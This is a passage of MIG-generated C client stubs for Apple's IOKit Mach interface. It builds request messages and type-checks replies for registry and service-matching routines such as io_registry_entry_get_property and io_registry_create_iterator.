		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->existing.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->existing.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_service_get_matching_services_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_service_get_matching_services */
mig_external kern_return_t io_service_get_matching_services
(
	mach_port_t master_port,
	io_string_t matching,
	mach_port_t *existing
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t matchingOffset; /* MiG doesn't use it */
		mach_msg_type_number_t matchingCnt;
		char matching[512];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t existing;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_service_get_matching_services_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_service_get_matching_services_t__defined */

	__DeclareSendRpc(2804, "io_service_get_matching_services")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->matching, matching, 512);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->matchingCnt = (mach_msg_type_number_t) mig_strncpy(InP->matching, matching, 512);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->matchingOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 512) + (_WALIGN_(InP->matchingCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2804;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2804, "io_service_get_matching_services")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2804, "io_service_get_matching_services")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_service_get_matching_services_t__defined)
	check_result = __MIG_check__Reply__io_service_get_matching_services_t((__Reply__io_service_get_matching_services_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_service_get_matching_services_t__defined) */

	*existing = Out0P->existing.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_get_property_t__defined)
#define __MIG_check__Reply__io_registry_entry_get_property_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_get_property_t(__Reply__io_registry_entry_get_property_t *Out0P)
{

	typedef __Reply__io_registry_entry_get_property_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2905) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->properties.type != MACH_MSG_OOL_DESCRIPTOR) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

#if __MigTypeCheck
	if (Out0P->properties.size != Out0P->propertiesCnt)
		return MIG_TYPE_ERROR;
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_get_property_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_get_property */
mig_external kern_return_t io_registry_entry_get_property
(
	mach_port_t registry_entry,
	io_name_t property_name,
	io_buf_ptr_t *properties,
	mach_msg_type_number_t *propertiesCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t property_nameOffset; /* MiG doesn't use it */
		mach_msg_type_number_t property_nameCnt;
		char property_name[128];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t properties;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t propertiesCnt;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_get_property_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_get_property_t__defined */

	__DeclareSendRpc(2805, "io_registry_entry_get_property")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->property_name, property_name, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->property_nameCnt = (mach_msg_type_number_t) mig_strncpy(InP->property_name, property_name, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->property_nameOffset = 0;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + (_WALIGN_(InP->property_nameCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = registry_entry;
	InP->Head.msgh_id = 2805;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2805, "io_registry_entry_get_property")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2805, "io_registry_entry_get_property")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_entry_get_property_t__defined)
	check_result = __MIG_check__Reply__io_registry_entry_get_property_t((__Reply__io_registry_entry_get_property_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_entry_get_property_t__defined) */

	*properties = (io_buf_ptr_t)(Out0P->properties.address);
	*propertiesCnt = Out0P->propertiesCnt;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_create_iterator_t__defined)
#define __MIG_check__Reply__io_registry_create_iterator_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_create_iterator_t(__Reply__io_registry_create_iterator_t *Out0P)
{

	typedef __Reply__io_registry_create_iterator_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2906) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->iterator.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->iterator.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_create_iterator_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_create_iterator */
mig_external kern_return_t io_registry_create_iterator
(
	mach_port_t master_port,
	io_name_t plane,
	uint32_t options,
	mach_port_t *iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t planeOffset; /* MiG doesn't use it */
		mach_msg_type_number_t planeCnt;
		char plane[128];
		uint32_t options;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t iterator;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__io_registry_create_iterator_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_create_iterator_t__defined */

	__DeclareSendRpc(2806, "io_registry_create_iterator")

	InP->NDR = NDR_record;

#ifdef USING_MIG_STRNCPY_ZEROFILL
	if (mig_strncpy_zerofill != NULL) {
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy_zerofill(InP->plane, plane, 128);
	} else {
#endif /* USING_MIG_STRNCPY_ZEROFILL */
		InP->planeCnt = (mach_msg_type_number_t) mig_strncpy(InP->plane, plane, 128);
#ifdef USING_MIG_STRNCPY_ZEROFILL
	}
#endif /* USING_MIG_STRNCPY_ZEROFILL */
	InP->planeOffset = 0;

	msgh_size_delta = _WALIGN_(InP->planeCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 128) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 128);

	InP->options = options;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = master_port;
	InP->Head.msgh_id = 2806;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2806, "io_registry_create_iterator")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2806, "io_registry_create_iterator")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_create_iterator_t__defined)
	check_result = __MIG_check__Reply__io_registry_create_iterator_t((__Reply__io_registry_create_iterator_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_create_iterator_t__defined) */

	*iterator = Out0P->iterator.name;
	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_iterator_enter_entry_t__defined)
#define __MIG_check__Reply__io_registry_iterator_enter_entry_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_iterator_enter_entry_t(__Reply__io_registry_iterator_enter_entry_t *Out0P)
{

	typedef __Reply__io_registry_iterator_enter_entry_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2907) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_registry_iterator_enter_entry_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_iterator_enter_entry */
mig_external kern_return_t io_registry_iterator_enter_entry
(
	mach_port_t iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_iterator_enter_entry_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_iterator_enter_entry_t__defined */

	__DeclareSendRpc(2807, "io_registry_iterator_enter_entry")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = iterator;
	InP->Head.msgh_id = 2807;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2807, "io_registry_iterator_enter_entry")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2807, "io_registry_iterator_enter_entry")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_iterator_enter_entry_t__defined)
	check_result = __MIG_check__Reply__io_registry_iterator_enter_entry_t((__Reply__io_registry_iterator_enter_entry_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_iterator_enter_entry_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_iterator_exit_entry_t__defined)
#define __MIG_check__Reply__io_registry_iterator_exit_entry_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_iterator_exit_entry_t(__Reply__io_registry_iterator_exit_entry_t *Out0P)
{

	typedef __Reply__io_registry_iterator_exit_entry_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 2908) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__io_registry_iterator_exit_entry_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_iterator_exit_entry */
mig_external kern_return_t io_registry_iterator_exit_entry
(
	mach_port_t iterator
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__io_registry_iterator_exit_entry_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_iterator_exit_entry_t__defined */

	__DeclareSendRpc(2808, "io_registry_iterator_exit_entry")

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = iterator;
	InP->Head.msgh_id = 2808;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(2808, "io_registry_iterator_exit_entry")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(2808, "io_registry_iterator_exit_entry")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__io_registry_iterator_exit_entry_t__defined)
	check_result = __MIG_check__Reply__io_registry_iterator_exit_entry_t((__Reply__io_registry_iterator_exit_entry_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__io_registry_iterator_exit_entry_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__iokit_subsystem__
#if !defined(__MIG_check__Reply__io_registry_entry_from_path_t__defined)
#define __MIG_check__Reply__io_registry_entry_from_path_t__defined

mig_internal kern_return_t __MIG_check__Reply__io_registry_entry_from_path_t(__Reply__io_registry_entry_from_path_t *Out0P)
{

	typedef __Reply__io_registry_entry_from_path_t __Reply __attribute__((unused));
	boolean_t msgh_simple;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	if (Out0P->Head.msgh_id != 2909) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

	msgh_simple = !(Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX);
#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((msgh_simple || Out0P->msgh_body.msgh_descriptor_count != 1 ||
	    msgh_size != (mach_msg_size_t)sizeof(__Reply)) &&
	    (!msgh_simple || msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	    ((mig_reply_error_t *)Out0P)->RetCode == KERN_SUCCESS))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (msgh_simple) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

#if	__MigTypeCheck
	if (Out0P->registry_entry.type != MACH_MSG_PORT_DESCRIPTOR ||
	    Out0P->registry_entry.disposition != 17) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__io_registry_entry_from_path_t__defined) */
#endif /* __MIG_check__Reply__iokit_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine io_registry_entry_from_path */
mig_external kern_return_t io_registry_entry_from_path
(
	mach_port_t master_port,
	io_string_t path,
	mach_port_t *registry_entry
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_msg_type_number_t pathOffset; /* MiG doesn't use it */
		mach_msg_type_number_t pathCnt;
		char path[512];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t registry_entry;
		/* end of the kernel processed data */
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__io_registry_entry_from_path_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__io_registry_entry_from_path_t__defined */

	__DeclareSendRpc(2809, "io_registry_entry_from_path")

	InP->NDR = NDR_record;

